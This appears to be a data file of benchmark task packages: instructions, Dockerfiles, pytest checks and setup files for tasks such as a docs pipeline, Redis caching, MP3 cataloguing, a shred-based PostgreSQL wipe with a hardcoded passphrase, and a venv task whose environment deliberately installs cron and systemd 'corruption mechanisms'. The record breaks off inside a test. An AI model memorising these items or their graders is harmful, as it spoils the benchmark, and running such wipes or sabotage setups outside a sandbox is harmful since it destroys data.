/tmp/create_dbf.py""}",2025-07-21T17:06:46.094252,2025-07-21T17:19:32.199834
draft_dp_2b22db3f,medium,draft_dp_2b22db3f,software-engineering,The docs are scattered across markdown files and we need them served as a website. Set up an automated pipeline that builds and publishes HTML docs whenever we push markdown files to the repo.,software-engineering,build-automation|web-server|git,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install required packages
RUN apt-get update && apt-get install -y \
    nginx \
    git \
    inotify-tools \
    && rm -rf /var/lib/apt/lists/*

# Install Python packages
RUN pip install mkdocs mkdocs-material requests

WORKDIR /app

# Create git repository
RUN git init && \
    git config user.email ""dev@example.com"" && \
    git config user.name ""Developer""

# Copy initial documentation files
COPY docs/ /app/docs/
COPY mkdocs.yml /app/
COPY nginx.conf /etc/nginx/nginx.conf

# Make initial commit
RUN git add . && git commit -m ""Initial documentation""

# Create directories for nginx
RUN mkdir -p /tmp /app/site

# Set permissions
RUN chmod -R 755 /app

WORKDIR /app","import os
import subprocess
import time
import requests

def test_automated_build_pipeline():
    """"""Test that the documentation build pipeline is set up and working.""""""
    # Check if build automation exists (either git hook or watcher script)
    hook_exists = os.path.exists('/app/.git/hooks/post-commit') and os.access('/app/.git/hooks/post-commit', os.X_OK)
    watcher_exists = subprocess.run(['pgrep', '-f', 'watch.*build'], capture_output=True).returncode == 0
    
    assert hook_exists or watcher_exists, ""No automated build system found (neither git hook nor file watcher)""

def test_docs_served_on_webserver():
    """"""Test that documentation is being served by the web server.""""""
    # Try to access the web server
    try:
        response = requests.get('http://localhost:8080/', timeout=5)
        assert response.status_code == 200, f""Web server returned status {response.status_code}""
        assert 'Documentation' in response.text or 'Project' in response.text, ""Documentation content not found""
    except requests.exceptions.RequestException as e:
        assert False, f""Could not connect to web server: {e}""","{""test_automated_build_pipeline"": 0.5, ""test_docs_served_on_webserver"": 0.5}","{""mkdocs.yml"": ""site_name: Project Documentation\ntheme:\n  name: material\n  features:\n    - navigation.tabs\n    - navigation.sections\n    - toc.integrate\n    - search.suggest\n\nnav:\n  - Home: index.md\n  - API:\n    - Overview: api/overview.md\n  - Guides:\n    - Installation: guides/installation.md\n\nmarkdown_extensions:\n  - pymdownx.highlight:\n      anchor_linenums: true\n  - pymdownx.superfences\n  - toc:\n      permalink: true\n\nplugins:\n  - search"", ""nginx.conf"": ""worker_processes 1;\ndaemon off;\nerror_log /tmp/nginx_error.log;\npid /tmp/nginx.pid;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n    \n    access_log /tmp/nginx_access.log;\n    \n    sendfile on;\n    keepalive_timeout 65;\n    \n    server {\n        listen 8080;\n        server_name localhost;\n        \n        root /app/site;\n        index index.html;\n        \n        location / {\n            try_files $uri $uri/ =404;\n        }\n    }\n}"", ""docs/index.md"": ""# Documentation\n\nWelcome to our project documentation.\n\n## Getting Started\n\nThis is the main documentation page.\n\n## Features\n\n- Easy to use\n- Fast performance\n- Reliable"", ""docs/guides/installation.md"": ""# Installation Guide\n\nFollow these steps to install our software:\n\n1. Clone the repository\n2. Install dependencies\n3. Run the setup script\n\n```bash\ngit clone https://github.com/example/project\ncd project\npip install -r requirements.txt\npython setup.py install\n```\n\n## System Requirements\n\n- Python 3.8+\n- 4GB RAM\n- 10GB disk space"", ""docs/api/overview.md"": ""# API Overview\n\nOur API provides the following endpoints:\n\n## Authentication\n\n```python\nimport requests\n\nresponse = requests.post('/api/auth/login', json={\n    'username': 'user',\n    'password': 'pass'\n})\n```\n\n## Data Endpoints\n\n### GET /api/data\nReturns all data entries.\n\n### POST /api/data\nCreates a new data entry.""}",2025-07-21T17:43:40.732748,2025-07-21T17:46:15.242629
draft_dp_aea2befa,medium,draft_dp_aea2befa,software-engineering,"The podcast trimmer API at /trim isn't working. Fix it to accept RSS feed URL, episode index, start/end times in seconds, and return the trimmed MP3.",software-engineering,api|audio-processing|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN apt-get update && apt-get install -y \
    ffmpeg \
    && rm -rf /var/lib/apt/lists/*

RUN pip install flask feedparser requests pydub

# Copy the broken application files
COPY app.py /app/
COPY test_feed.xml /app/
COPY generate_mp3.py /app/

# Generate the sample MP3 file
RUN python generate_mp3.py && rm generate_mp3.py

EXPOSE 5000

CMD [""python"", ""app.py""]","import subprocess
import json
import os
import time

def test_trim_endpoint_works():
    """"""Test that the /trim endpoint successfully processes a request and returns an MP3 file.""""""
    # Wait for Flask to start
    time.sleep(2)
    
    # Test data
    data = {
        ""rss_url"": ""http://localhost:5000/test_feed.xml"",
        ""episode_index"": 0,
        ""start_time"": 10,
        ""end_time"": 30
    }
    
    # Make request to trim endpoint
    result = subprocess.run([
        'curl', '-X', 'POST',
        '-H', 'Content-Type: application/json',
        '-d', json.dumps(data),
        '-o', '/tmp/trimmed.mp3',
        '-w', '%{http_code}',
        '-s',
        'http://localhost:5000/trim'
    ], capture_output=True, text=True)
    
    # Should return 200 status code
    assert result.stdout.strip() == '200', f""Expected 200, got {result.stdout.strip()}""
    
    # Should create an MP3 file
    assert os.path.exists('/tmp/trimmed.mp3'), ""Trimmed MP3 file not created""
    
    # File should have reasonable size (not empty, not full episode)
    file_size = os.path.getsize('/tmp/trimmed.mp3')
    assert 1000 < file_size < 500000, f""Unexpected file size: {file_size}""

def test_invalid_episode_index_handled():
    """"""Test that invalid episode index returns appropriate error.""""""
    # Wait for Flask to start
    time.sleep(2)
    
    # Test with invalid episode index
    data = {
        ""rss_url"": ""http://localhost:5000/test_feed.xml"",
        ""episode_index"": 999,
        ""start_time"": 0,
        ""end_time"": 10
    }
    
    result = subprocess.run([
        'curl', '-X', 'POST',
        '-H', 'Content-Type: application/json',
        '-d', json.dumps(data),
        '-w', '%{http_code}',
        '-s',
        'http://localhost:5000/trim'
    ], capture_output=True, text=True)
    
    # Should return 400 or 404 for invalid episode
    status_code = result.stdout.strip()
    assert status_code in ['400', '404'], f""Expected 400/404 for invalid episode, got {status_code}""","{""test_trim_endpoint_works"": 0.7, ""test_invalid_episode_index_handled"": 0.3}","{""test_feed.xml"": ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n<rss version=\""2.0\"">\n  <channel>\n    <title>Test Podcast</title>\n    <description>A test podcast feed</description>\n    <link>http://localhost:5000</link>\n    <item>\n      <title>Episode 1: Introduction</title>\n      <description>Our first episode</description>\n      <enclosure url=\""http://localhost:5000/sample_episode.mp3\"" length=\""1234567\"" type=\""audio/mpeg\""/>\n      <guid>episode-001</guid>\n      <pubDate>Mon, 01 Jan 2024 00:00:00 GMT</pubDate>\n    </item>\n    <item>\n      <title>Episode 2: Deep Dive</title>\n      <description>Going deeper</description>\n      <enclosure url=\""http://localhost:5000/sample_episode.mp3\"" length=\""2345678\"" type=\""audio/mpeg\""/>\n      <guid>episode-002</guid>\n      <pubDate>Mon, 08 Jan 2024 00:00:00 GMT</pubDate>\n    </item>\n  </channel>\n</rss>"", ""generate_mp3.py"": ""#!/usr/bin/env python3\nimport struct\n\n# Create a minimal valid MP3 file (silence)\n# MP3 frame header for 128kbps, 44.1kHz, stereo\nheader = b'\\xff\\xfb\\x90\\x00'\n# Minimal MP3 frame data (silence)\nframe_data = b'\\x00' * 413  # Frame size for 128kbps\n# Create about 60 seconds of audio (approx 38 frames per second)\nframes = (header + frame_data) * (38 * 60)\nwith open('sample_episode.mp3', 'wb') as f:\n    f.write(frames)"", ""app.py"": ""from flask import Flask, request, jsonify, send_file\nimport feedparser\nimport requests\nfrom pydub import AudioSegment\nimport os\nimport tempfile\n\napp = Flask(__name__)\n\n@app.route('/trim', methods=['POST'])\ndef trim_podcast():\n    # TODO: Implement the podcast trimming functionality\n    # This endpoint should:\n    # 1. Accept RSS feed URL, episode index, start_time, end_time\n    # 2. Parse the RSS feed\n    # 3. Download the episode\n    # 4. Trim it to the specified segment\n    # 5. Return the MP3 file\n    \n    return jsonify({\""error\"": \""Not implemented\""}), 501\n\n@app.route('/health', methods=['GET'])\ndef health():\n    return jsonify({\""status\"": \""ok\""}), 200\n\n@app.route('/test_feed.xml', methods=['GET'])\ndef serve_test_feed():\n    return send_file('test_feed.xml', mimetype='application/rss+xml')\n\n@app.route('/sample_episode.mp3', methods=['GET'])\ndef serve_sample_episode():\n    return send_file('sample_episode.mp3', mimetype='audio/mpeg')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)""}",2025-07-21T17:47:43.459102,2025-07-21T17:48:40.351519
draft_dp_0d117ee8,hard,draft_dp_0d117ee8,software-engineering,The ad optimizer's analytics are too slow with 10k+ impressions. Add Redis caching to speed up the performance reports - need at least 3x improvement.,software-engineering,python|caching|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN apt-get update && apt-get install -y redis-server && apt-get clean

# Install Python dependencies
RUN pip install numpy redis flask

# Copy application files
COPY ad_optimizer.py /app/
COPY sample_data.json /app/

# Create startup script
RUN echo '#!/bin/bash\nredis-server --daemonize yes\npython /app/ad_optimizer.py &\nsleep 2\nexec ""$@""' > /entrypoint.sh && \
    chmod +x /entrypoint.sh

ENTRYPOINT [""/entrypoint.sh""]
CMD [""/bin/bash""]","import subprocess
import time
import json

def test_caching_performance_improvement():
    """"""Test that Redis caching provides at least 3x speedup for analytics queries.""""""
    # Add many impressions to make the difference noticeable
    for i in range(50):
        subprocess.run(['curl', '-s', f'http://localhost:5000/record_click/{i%5}/1'], 
                      capture_output=True)
    
    # First call (should cache)
    start = time.time()
    result1 = subprocess.run(['curl', '-s', 'http://localhost:5000/analytics'], 
                           capture_output=True, text=True)
    first_time = time.time() - start
    
    # Second call (should use cache)
    start = time.time()
    result2 = subprocess.run(['curl', '-s', 'http://localhost:5000/analytics'], 
                           capture_output=True, text=True)
    cached_time = time.time() - start
    
    # Both should return valid data
    data1 = json.loads(result1.stdout)
    data2 = json.loads(result2.stdout)
    assert data1['total_impressions'] > 20
    assert data1 == data2
    
    # Cache should provide at least 3x speedup
    speedup = first_time / cached_time if cached_time > 0 else float('inf')
    assert speedup >= 3.0, f""Expected 3x speedup, got {speedup:.1f}x""

def test_optimizer_selects_best_ad():
    """"""Test that Thompson Sampling converges to selecting the best-performing ad.""""""
    # Record many clicks to establish clear winner (ad 1 has highest CTR in sample data)
    for _ in range(20):
        subprocess.run(['curl', '-s', 'http://localhost:5000/record_click/1/1'], 
                      capture_output=True)
    
    # Get multiple ad selections
    selections = []
    for _ in range(10):
        result = subprocess.run(['curl', '-s', 'http://localhost:5000/select_ad'], 
                              capture_output=True, text=True)
        data = json.loads(result.stdout)
        selections.append(data['ad_id'])
    
    # Ad 1 should be selected most often
    ad1_selections = selections.count(1)
    assert ad1_selections >= 7, f""Expected ad 1 to be selected ≥7 times, got {ad1_selections}""","{""test_caching_performance_improvement"": 0.7, ""test_optimizer_selects_best_ad"": 0.3}","{""sample_data.json"": ""{\n  \""impressions\"": [\n    {\""ad_id\"": 0, \""clicked\"": false},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 2, \""clicked\"": false},\n    {\""ad_id\"": 0, \""clicked\"": true},\n    {\""ad_id\"": 3, \""clicked\"": false},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 4, \""clicked\"": false},\n    {\""ad_id\"": 2, \""clicked\"": true},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 0, \""clicked\"": false},\n    {\""ad_id\"": 3, \""clicked\"": true},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 2, \""clicked\"": false},\n    {\""ad_id\"": 4, \""clicked\"": true},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 0, \""clicked\"": false},\n    {\""ad_id\"": 1, \""clicked\"": true},\n    {\""ad_id\"": 3, \""clicked\"": false},\n    {\""ad_id\"": 2, \""clicked\"": false},\n    {\""ad_id\"": 1, \""clicked\"": true}\n  ]\n}"", ""ad_optimizer.py"": ""import json\nimport numpy as np\nfrom flask import Flask, jsonify\nimport time\n\napp = Flask(__name__)\n\nclass ThompsonSamplingOptimizer:\n    def __init__(self, n_ads):\n        self.n_ads = n_ads\n        self.alpha = np.ones(n_ads)  # successes + 1\n        self.beta = np.ones(n_ads)   # failures + 1\n        self.impressions = []\n        \n    def select_ad(self):\n        # Thompson Sampling: sample from Beta distributions\n        samples = [np.random.beta(self.alpha[i], self.beta[i]) for i in range(self.n_ads)]\n        return np.argmax(samples)\n    \n    def update(self, ad_id, clicked):\n        impression = {\n            'ad_id': ad_id,\n            'clicked': clicked,\n            'timestamp': time.time()\n        }\n        self.impressions.append(impression)\n        \n        if clicked:\n            self.alpha[ad_id] += 1\n        else:\n            self.beta[ad_id] += 1\n    \n    def get_analytics(self):\n        # Slow analytics computation\n        analytics = {\n            'total_impressions': len(self.impressions),\n            'ads': []\n        }\n        \n        for ad_id in range(self.n_ads):\n            ad_impressions = [imp for imp in self.impressions if imp['ad_id'] == ad_id]\n            clicks = sum(1 for imp in ad_impressions if imp['clicked'])\n            \n            ad_stats = {\n                'ad_id': ad_id,\n                'impressions': len(ad_impressions),\n                'clicks': clicks,\n                'ctr': clicks / len(ad_impressions) if ad_impressions else 0,\n                'estimated_ctr': self.alpha[ad_id] / (self.alpha[ad_id] + self.beta[ad_id])\n            }\n            analytics['ads'].append(ad_stats)\n            \n        # Simulate expensive computation\n        time.sleep(0.001 * len(self.impressions) / 100)  # Gets slower with more data\n        \n        return analytics\n\n# Initialize optimizer\noptimizer = ThompsonSamplingOptimizer(n_ads=5)\n\n# Load sample data\nwith open('sample_data.json', 'r') as f:\n    sample_data = json.load(f)\n    for impression in sample_data['impressions']:\n        optimizer.update(impression['ad_id'], impression['clicked'])\n\n@app.route('/select_ad')\ndef select_ad():\n    ad_id = optimizer.select_ad()\n    return jsonify({'ad_id': ad_id})\n\n@app.route('/record_click/<int:ad_id>/<int:clicked>')\ndef record_click(ad_id, clicked):\n    optimizer.update(ad_id, bool(clicked))\n    return jsonify({'success': True})\n\n@app.route('/analytics')\ndef get_analytics():\n    start_time = time.time()\n    analytics = optimizer.get_analytics()\n    analytics['computation_time'] = time.time() - start_time\n    return jsonify(analytics)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)""}",2025-07-21T17:18:34.548440,2025-07-21T17:19:48.582050
draft_dp_86367291,extremely_hard,draft_dp_86367291,system-administration,"Need to decommission the PostgreSQL server with sensitive customer data. Create an encrypted backup at /secure/backups/postgres_final.sql.gz.gpg (passphrase: customer-data-secure-2024), then securely wipe all database files with shred.",system-administration,sys-admin|encryption|security,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install PostgreSQL 16 and required tools
RUN apt-get update && apt-get install -y \
    postgresql-16 \
    postgresql-client-16 \
    postgresql-contrib-16 \
    gnupg2 \
    gzip \
    sudo \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Copy data initialization script
COPY init_databases.sql /tmp/init_databases.sql

# Set up PostgreSQL with trust auth initially
USER postgres
RUN /etc/init.d/postgresql start && \
    psql --command ""ALTER USER postgres WITH PASSWORD 'db_admin_2024';"" && \
    psql -f /tmp/init_databases.sql && \
    /etc/init.d/postgresql stop

# Copy secure pg_hba.conf after setup
USER root
COPY pg_hba.conf /etc/postgresql/16/main/pg_hba.conf

# Clean up initialization file
RUN rm /tmp/init_databases.sql

# Create backup directory
RUN mkdir -p /secure/backups && chmod 755 /secure/backups

# Set permissions
RUN chown -R postgres:postgres /var/lib/postgresql/16/main/ && \
    chmod 700 /var/lib/postgresql/16/main/ && \
    chown postgres:postgres /etc/postgresql/16/main/pg_hba.conf

USER root
WORKDIR /root

# Ensure PostgreSQL is running on container start
CMD [""bash"", ""-c"", ""service postgresql start && /bin/bash""]","import os
import subprocess
import gzip
import tempfile

def test_postgresql_service_removed():
    """"""Test that PostgreSQL service is stopped and package is removed""""""
    # Check service is not running
    service_check = subprocess.run(['systemctl', 'is-active', 'postgresql'], 
                                 capture_output=True, text=True)
    assert service_check.returncode != 0, ""PostgreSQL service should not be active""
    
    # Check PostgreSQL package is removed
    dpkg_check = subprocess.run(['dpkg', '-l', 'postgresql-16'], 
                              capture_output=True, text=True)
    assert 'ii  postgresql-16' not in dpkg_check.stdout, ""PostgreSQL package should be removed""

def test_encrypted_backup_valid():
    """"""Test that encrypted backup exists and contains valid data""""""
    backup_path = '/secure/backups/postgres_final.sql.gz.gpg'
    
    # Check backup file exists
    assert os.path.exists(backup_path), f""Encrypted backup should exist at {backup_path}""
    
    # Test decryption with correct passphrase
    with tempfile.NamedTemporaryFile(mode='wb', delete=False) as temp_file:
        decrypt_cmd = subprocess.run(
            ['gpg', '--decrypt', '--batch', '--passphrase', 'customer-data-secure-2024', backup_path],
            capture_output=True
        )
        assert decrypt_cmd.returncode == 0, ""Should decrypt with correct passphrase""
        temp_file.write(decrypt_cmd.stdout)
        temp_path = temp_file.name
    
    # Test decompression and check for valid SQL
    try:
        with gzip.open(temp_path, 'rt') as gz_file:
            sql_content = gz_file.read()
            # Check for expected database dumps
            assert 'customer_data' in sql_content, ""Backup should contain customer_data database""
            assert 'orders_db' in sql_content, ""Backup should contain orders_db database""
            assert 'CREATE TABLE customers' in sql_content, ""Backup should contain customers table definition""
            assert 'CREATE TABLE payment_methods' in sql_content, ""Backup should contain payment_methods table""
    finally:
        os.unlink(temp_path)

def test_data_securely_deleted():
    """"""Test that PostgreSQL data directories have been securely removed""""""
    # Check main data directory is gone
    assert not os.path.exists('/var/lib/postgresql/16/main/'), ""PostgreSQL data directory should be deleted""
    
    # Check config directory is gone
    assert not os.path.exists('/etc/postgresql/16/'), ""PostgreSQL config directory should be deleted""
    
    # Check no PostgreSQL directories remain
    assert not os.path.exists('/var/lib/postgresql/'), ""All PostgreSQL data should be removed""","{""test_postgresql_service_removed"": 0.3, ""test_encrypted_backup_valid"": 0.4, ""test_data_securely_deleted"": 0.3}","{""init_databases.sql"": ""-- Create customer database\nCREATE DATABASE customer_data;\n\n\\c customer_data\n\n-- Create customers table\nCREATE TABLE customers (\n    id SERIAL PRIMARY KEY,\n    first_name VARCHAR(50),\n    last_name VARCHAR(50),\n    email VARCHAR(100),\n    phone VARCHAR(20),\n    address VARCHAR(200),\n    city VARCHAR(50),\n    state VARCHAR(2),\n    zip VARCHAR(10),\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Create payment_methods table\nCREATE TABLE payment_methods (\n    id SERIAL PRIMARY KEY,\n    customer_id INTEGER REFERENCES customers(id),\n    card_number VARCHAR(20),\n    card_type VARCHAR(20),\n    expiry_date VARCHAR(7),\n    billing_address VARCHAR(200)\n);\n\n-- Insert sample customer data\nINSERT INTO customers (first_name, last_name, email, phone, address, city, state, zip) VALUES\n('John', 'Smith', 'john.smith@email.com', '555-0101', '123 Main St', 'Anytown', 'CA', '90210'),\n('Jane', 'Doe', 'jane.doe@email.com', '555-0102', '456 Oak Ave', 'Springfield', 'IL', '62701'),\n('Robert', 'Johnson', 'rjohnson@email.com', '555-0103', '789 Pine Rd', 'Austin', 'TX', '78701'),\n('Maria', 'Garcia', 'mgarcia@email.com', '555-0104', '321 Elm St', 'Denver', 'CO', '80201'),\n('David', 'Wilson', 'dwilson@email.com', '555-0105', '654 Maple Dr', 'Seattle', 'WA', '98101');\n\n-- Insert sample payment data\nINSERT INTO payment_methods (customer_id, card_number, card_type, expiry_date, billing_address) VALUES\n(1, '4532-1234-5678-9012', 'Visa', '12/2025', '123 Main St, Anytown, CA 90210'),\n(2, '5412-8765-4321-0987', 'Mastercard', '06/2026', '456 Oak Ave, Springfield, IL 62701'),\n(3, '3782-123456-78901', 'Amex', '09/2025', '789 Pine Rd, Austin, TX 78701'),\n(4, '4916-9876-5432-1098', 'Visa', '03/2027', '321 Elm St, Denver, CO 80201'),\n(5, '5555-4444-3333-2222', 'Mastercard', '11/2026', '654 Maple Dr, Seattle, WA 98101');\n\n-- Create orders database\nCREATE DATABASE orders_db;\n\n\\c orders_db\n\n-- Create orders table\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    customer_id INTEGER,\n    order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    total_amount DECIMAL(10,2),\n    status VARCHAR(20)\n);\n\n-- Insert sample orders\nINSERT INTO orders (customer_id, order_date, total_amount, status) VALUES\n(1, '2024-01-15 10:30:00', 129.99, 'completed'),\n(2, '2024-01-16 14:20:00', 89.50, 'completed'),\n(3, '2024-01-17 09:15:00', 249.00, 'processing'),\n(4, '2024-01-18 16:45:00', 75.25, 'completed'),\n(5, '2024-01-19 11:00:00', 199.99, 'shipped');"", ""pg_hba.conf"": ""# TYPE  DATABASE        USER            ADDRESS                 METHOD\nlocal   all             postgres                                md5\nlocal   all             all                                     md5\nhost    all             all             127.0.0.1/32            md5\nhost    all             all             ::1/128                 md5""}",2025-07-21T17:49:40.781863,2025-07-21T18:00:29.548569
draft_dp_ae7cc23c,medium,draft_dp_ae7cc23c,data-processing,"Extract metadata from all MP3s in /app/music/ and generate a JSON catalog at /app/music_catalog.json with title, artist, album, year, genre, track number, and duration fields.",data-processing,python|data-extraction|audio-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install mutagen

COPY generate_mp3s.py /app/

RUN python /app/generate_mp3s.py && rm /app/generate_mp3s.py

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_catalog_exists_and_valid_json():
    """"""Test that music_catalog.json exists and contains valid JSON""""""
    assert os.path.exists('/app/music_catalog.json'), ""music_catalog.json should exist""
    
    with open('/app/music_catalog.json', 'r') as f:
        data = json.load(f)
    
    assert isinstance(data, list), ""Catalog should be a list of songs""
    assert len(data) == 6, ""Should have 6 MP3 files cataloged""
    
    # Check required fields exist in each entry
    required_fields = ['title', 'artist', 'album', 'year', 'genre', 'track', 'duration']
    for song in data:
        assert isinstance(song, dict), ""Each entry should be a dictionary""
        for field in required_fields:
            assert field in song, f""Field '{field}' should exist in each song entry""
        assert isinstance(song['duration'], (int, float)), ""Duration should be a number""

def test_metadata_extraction_accuracy():
    """"""Test that metadata is correctly extracted from files with complete tags""""""
    with open('/app/music_catalog.json', 'r') as f:
        catalog = json.load(f)
    
    # Find the entries with known complete metadata
    complete_entries = [s for s in catalog if s.get('title') == 'Summer Breeze']
    assert len(complete_entries) == 1, ""Should find 'Summer Breeze' in catalog""
    
    song = complete_entries[0]
    assert song['artist'] == 'The Beach Band', ""Artist should be correctly extracted""
    assert song['album'] == 'Ocean Vibes', ""Album should be correctly extracted""
    assert song['year'] == 2023, ""Year should be correctly extracted""
    assert song['genre'] == 'Pop', ""Genre should be correctly extracted""
    assert song['track'] == 3, ""Track number should be correctly extracted""
    
    # Check that files with missing metadata have null values
    no_metadata_entries = [s for s in catalog if s.get('title') is None]
    assert len(no_metadata_entries) >= 1, ""Should have at least one file with no metadata""","{""test_catalog_exists_and_valid_json"": 0.4, ""test_metadata_extraction_accuracy"": 0.6}","{""generate_mp3s.py"": ""#!/usr/bin/env python3\nimport os\nimport struct\nfrom mutagen.mp3 import MP3\nfrom mutagen.id3 import ID3, TIT2, TPE1, TALB, TDRC, TCON, TRCK, ID3NoHeaderError\n\ndef create_silence_mp3(filename, duration_ms=1000):\n    \""\""\""Create a minimal valid MP3 file with silence\""\""\""\n    sample_rate = 44100\n    bitrate = 128\n    \n    # MP3 frame header for 128kbps, 44.1kHz, stereo\n    frame_header = b'\\xff\\xfb\\x90\\x00'\n    \n    # Calculate frame size and create silent frame data\n    frame_size = 144 * bitrate * 1000 // sample_rate\n    frame_data = frame_header + b'\\x00' * (frame_size - 4)\n    \n    # Calculate number of frames needed\n    frames_needed = duration_ms * bitrate // 8 // frame_size\n    \n    with open(filename, 'wb') as f:\n        for _ in range(frames_needed):\n            f.write(frame_data)\n\ndef add_id3v2_tags(filename, title=None, artist=None, album=None, year=None, genre=None, track=None):\n    \""\""\""Add ID3v2 tags to an MP3 file\""\""\""\n    try:\n        tags = ID3(filename)\n    except ID3NoHeaderError:\n        tags = ID3()\n    \n    if title:\n        tags[\""TIT2\""] = TIT2(encoding=3, text=title)\n    if artist:\n        tags[\""TPE1\""] = TPE1(encoding=3, text=artist)\n    if album:\n        tags[\""TALB\""] = TALB(encoding=3, text=album)\n    if year:\n        tags[\""TDRC\""] = TDRC(encoding=3, text=str(year))\n    if genre:\n        tags[\""TCON\""] = TCON(encoding=3, text=genre)\n    if track:\n        tags[\""TRCK\""] = TRCK(encoding=3, text=str(track))\n    \n    tags.save(filename)\n\ndef add_id3v1_tags(filename, title=\""\"", artist=\""\"", album=\""\"", year=\""\"", genre_id=12, track=0):\n    \""\""\""Add ID3v1 tags to an MP3 file\""\""\""\n    # ID3v1 tag is 128 bytes at the end of the file\n    tag = b\""TAG\""\n    tag += title.encode('latin-1')[:30].ljust(30, b'\\x00')\n    tag += artist.encode('latin-1')[:30].ljust(30, b'\\x00')\n    tag += album.encode('latin-1')[:30].ljust(30, b'\\x00')\n    tag += year.encode('latin-1')[:4].ljust(4, b'\\x00')\n    tag += b'\\x00' * 28  # Comment field (28 bytes)\n    tag += b'\\x00'  # Zero byte before track number\n    tag += struct.pack('B', track)  # Track number\n    tag += struct.pack('B', genre_id)  # Genre ID\n    \n    with open(filename, 'ab') as f:\n        f.write(tag)\n\ndef corrupt_mp3_tags(filename):\n    \""\""\""Corrupt the ID3 tags by writing garbage data\""\""\""\n    with open(filename, 'r+b') as f:\n        # Write garbage at the beginning where ID3v2 tags would be\n        f.seek(0)\n        f.write(b'GARBAGE_DATA_HERE' * 10)\n\n# Create directory\nos.makedirs('/app/music', exist_ok=True)\n\n# 1. MP3 with complete ID3v2 tags\ncreate_silence_mp3('/app/music/complete_metadata.mp3', 2000)\nadd_id3v2_tags('/app/music/complete_metadata.mp3',\n               title=\""Summer Breeze\"",\n               artist=\""The Beach Band\"",\n               album=\""Ocean Vibes\"",\n               year=2023,\n               genre=\""Pop\"",\n               track=3)\n\n# 2. MP3 with only ID3v1 tags\ncreate_silence_mp3('/app/music/id3v1_only.mp3', 1500)\nadd_id3v1_tags('/app/music/id3v1_only.mp3',\n               title=\""Classic Rock Song\"",\n               artist=\""Old School Band\"",\n               album=\""Vintage Album\"",\n               year=\""1985\"",\n               genre_id=17,  # Rock\n               track=7)\n\n# 3. MP3 with partial metadata (missing some fields)\ncreate_silence_mp3('/app/music/partial_metadata.mp3', 1800)\nadd_id3v2_tags('/app/music/partial_metadata.mp3',\n               title=\""Incomplete Song\"",\n               artist=\""Mystery Artist\"")\n\n# 4. MP3 with no metadata\ncreate_silence_mp3('/app/music/no_metadata.mp3', 1200)\n\n# 5. MP3 with corrupted tags\ncreate_silence_mp3('/app/music/corrupted_tags.mp3', 1600)\nadd_id3v2_tags('/app/music/corrupted_tags.mp3',\n               title=\""Good Song\"",\n               artist=\""Nice Artist\"")\ncorrupt_mp3_tags('/app/music/corrupted_tags.mp3')\n\n# 6. Another complete MP3 for variety\ncreate_silence_mp3('/app/music/jazz_tune.mp3', 2500)\nadd_id3v2_tags('/app/music/jazz_tune.mp3',\n               title=\""Midnight Jazz\"",\n               artist=\""The Jazz Quartet\"",\n               album=\""Late Night Sessions\"",\n               year=2022,\n               genre=\""Jazz\"",\n               track=5)\n\nprint(\""MP3 files created successfully in /app/music/\"")""}",2025-07-21T17:56:10.941453,2025-07-22T15:11:59.862419+00:00
draft_dp_2f0966ba,extremely_hard,draft_dp_2f0966ba,debugging,Our Python venvs keep breaking - python and pip commands get replaced with fake scripts even after recreating the environments. Find what's causing this and fix it so venvs work normally.,debugging,python|troubleshooting|sys-admin,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install additional dependencies
RUN apt-get update && apt-get install -y \
    cron \
    systemd \
    inotify-tools \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# Create project directories
RUN mkdir -p /projects/webapp /projects/api /projects/ml-service /home/developer/.local/bin /opt/scripts

# Set up developer user
RUN useradd -m -s /bin/bash developer && \
    echo ""developer:dev123"" | chpasswd && \
    usermod -aG sudo developer

# Copy project files and scripts
COPY project_files/webapp /projects/webapp/
COPY project_files/api /projects/api/
COPY project_files/ml-service /projects/ml-service/
COPY scripts/monitor.sh /opt/scripts/
COPY scripts/fix_venv.sh /home/developer/.local/bin/
COPY scripts/venv_watcher.py /opt/scripts/
COPY config/venv-monitor.service /etc/systemd/system/
COPY config/venv-check /etc/cron.d/
COPY config/activate_hook.sh /etc/profile.d/

# Set permissions
RUN chmod +x /opt/scripts/monitor.sh /home/developer/.local/bin/fix_venv.sh /etc/profile.d/activate_hook.sh && \
    chmod 644 /etc/cron.d/venv-check && \
    chown -R developer:developer /projects /home/developer

# Enable services
RUN systemctl enable venv-monitor.service || true

# Create initial venvs as developer
USER developer
WORKDIR /projects/webapp
RUN python3 -m venv venv && \
    . venv/bin/activate && \
    pip install django==4.2.0 requests

WORKDIR /projects/api  
RUN python3 -m venv venv && \
    . venv/bin/activate && \
    pip install fastapi==0.104.0 uvicorn

WORKDIR /projects/ml-service
RUN python3 -m venv venv && \
    . venv/bin/activate && \
    pip install flask==3.0.0 numpy

USER root
WORKDIR /home/developer

# Start the corruption mechanisms
RUN service cron start && \
    systemctl start venv-monitor.service || true

CMD [""/bin/bash""]","import subprocess
import time
import os

def test_venvs_functional():
    """"""Test that Python venvs work correctly and stay functional""""""
    # Test each project's venv
    projects = ['/projects/webapp', '/projects/api', '/projects/ml-service']
    
    for project in projects:
        venv_python = os.path.join(project, 'venv', 'bin', 'python')
        
        # Test python command works
        result = subprocess.run([venv_python, '--version'], 
                              capture_output=True, text=True)
